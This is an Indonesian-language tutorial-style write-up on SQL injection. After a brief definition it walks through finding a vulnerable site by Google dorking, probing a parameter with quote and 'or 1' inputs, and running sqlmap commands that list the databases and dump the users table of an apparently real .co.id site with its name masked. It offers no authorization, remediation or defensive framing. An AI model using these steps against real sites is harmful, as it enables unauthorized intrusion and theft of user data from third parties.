Sql Injection

SQL Injection adalah salah satu teknik yang menyalahgunakan celah keamanan yang ada di SQL pada lapisan database suatu aplikasi atau di website. Celah ini terjadi karena input dari user tidak difilter secara benar dan dalam pembuatannya menggunakan form yang salah. Hal yang berdampak akibat SQL Injection :
 Bypass Otentikasi
 Pencurian informasi
 Hapus Data`
 perubahan data`

Pada saat melakukan dorking dengan menggunakan syntax dari GHDB didapatkan adanay situs yang mempunyai celah untuk dilakukan SQL Injection:

hasil mengirimkan syntax SQL pada parameter, dapat dicoba seperti : ','',or,1

Metode Exploitasi Sqlmap dengan menggunakan command:
•sqlmap -u https://www.xxxx.co.id/detail_products.php?id=550 --random-agent --batch --dbs

maka dari gambar diatas didapatkan Sql injection dengan parameter GET

Hasil eksploitasi :

lalu dilakukan cek ke file dari Database dengan :
•sqlmap -u https://www.xxxx.co.id/detail_products.php?id=550 --dbs -D nama DB -T users --columns -dump

Dan didapatkan isi dari database
